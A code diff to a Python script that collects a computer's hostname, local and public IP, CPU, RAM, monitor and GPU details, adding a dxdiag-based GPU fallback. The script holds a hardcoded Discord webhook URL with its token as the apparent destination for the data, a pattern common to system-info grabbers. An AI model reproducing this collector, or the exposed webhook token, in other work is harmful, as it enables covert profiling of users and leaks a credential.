@@ -2,9 +2,9 @@ import platform
 import requests
 import socket
 from cpuinfo import get_cpu_info
-import GPUtil
 import psutil
 from screeninfo import get_monitors
+import subprocess
 
 # Replace with your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1320641725034926133/l1Y2_9bYYvtluQR4Io67E96ubDUT_x9wGDOHHtYz0GifdZOfGNq0Su2AqPji3ttuIWj8"
@@ -17,16 +17,41 @@ def get_public_ip():
     except requests.RequestException as e:
         return f"Error fetching IP: {e}"
 
+def get_gpu_info():
+    gpu_details = []
+
+    try:
+        # Attempt to detect discrete GPUs using GPUtil
+        import GPUtil
+        gpus = GPUtil.getGPUs()
+        if gpus:
+            gpu_details = [f"{gpu.name} (Total Memory: {gpu.memoryTotal}MB)" for gpu in gpus]
+
+    except Exception:
+        pass  # GPUtil may not work on all systems
+
+    try:
+        # Fall back to detecting integrated GPUs or other GPUs using DirectX diagnostics
+        if not gpu_details:
+            result = subprocess.run(
+                ["dxdiag", "/t", "dxdiag.txt"], capture_output=True, text=True
+            )
+            with open("dxdiag.txt", "r") as file:
+                for line in file.readlines():
+                    if "Card name" in line:
+                        gpu_details.append(line.split(":")[1].strip())
+    except Exception:
+        pass  # Ignore errors in fallback method
+
+    return "; ".join(gpu_details) if gpu_details else "No GPU Detected"
+
 def get_machine_info():
     try:
         # CPU Info
         cpu_info = get_cpu_info()
         
         # GPU Info
-        gpu_info = GPUtil.getGPUs()
-        gpu_details = [
-            f"{gpu.name} (Total Memory: {gpu.memoryTotal}MB)" for gpu in gpu_info
-        ]
+        gpu_info = get_gpu_info()
         
         # RAM Info
         ram = psutil.virtual_memory()
@@ -48,7 +73,7 @@ def get_machine_info():
             "Hostname": socket.gethostname(),
             "IP Address": socket.gethostbyname(socket.gethostname()),
             "RAM": f"{ram_total_gb} GB",
-            "GPUs": "; ".join(gpu_details) if gpu_details else "No GPU Detected",
+            "GPUs": gpu_info,
             "Monitors": "; ".join(monitor_details) if monitor_details else "No Monitor Detected",
         }
     except Exception as e:
